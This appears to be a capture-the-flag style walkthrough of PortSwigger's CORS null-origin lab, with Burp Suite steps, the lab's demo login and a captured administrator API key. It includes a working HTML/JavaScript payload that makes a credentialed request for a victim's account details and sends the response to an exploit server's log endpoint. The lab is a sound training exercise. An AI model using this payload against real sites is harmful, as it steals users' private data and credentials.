## Welcome, my friend. Today we will start the [2. CORS lab](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack) in ```portswigger```
### Let's play this lab:

![image](https://github.com/user-attachments/assets/7ca449b7-d09d-4de3-8dbb-a33ce19ca8e2)

#### First, we navigate inside the browser

![image](https://github.com/user-attachments/assets/672c7594-e733-437d-9a26-6dc60b25df44)

#### We can log in to our account using the following credentials: ```wiener:peter```

![image](https://github.com/user-attachments/assets/abddadfa-eddd-46b4-a78f-10b2b162baa1)


### Now, We will use ```burp suite``` and intercept this requst:

![image](https://github.com/user-attachments/assets/de843131-9193-484a-98d3-4a3922af26bd)

## Try add origin header in header request such as:

```
Origin: null
```

![image](https://github.com/user-attachments/assets/88582e3a-ab8a-4edc-901c-260007626a27)


### This website is weak with CORS vulnerability , Now go to server exploit and add this code:

```
<html>
<body>
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0afa00740396955684640f0c00150066.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://exploit-0ac5009e030c950c841b0ef901e0002d.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
</body>
</html>
```

### enter ```sotre``` and ```Deliver exploit to vitim``` then ```access log```:

![image](https://github.com/user-attachments/assets/de7c39a8-203f-4326-9e5a-e53a434d00e3)


### api of administrator: ```1DZHcshk4FAk2HSMNpFETnWFEHxa9HGB```

![image](https://github.com/user-attachments/assets/102d2805-75cd-46c7-884f-c046deeaea12)

![image](https://github.com/user-attachments/assets/02c36ea1-094c-450f-999b-5f393a365b8a)



-------

### Done! Congratulations, friends‚ù§Ô∏è‚Äçüî•


<p align="center">
<img src="https://github.com/user-attachments/assets/49ddb0ee-3949-486e-ab16-e23eb9e8a7db" >
</p>
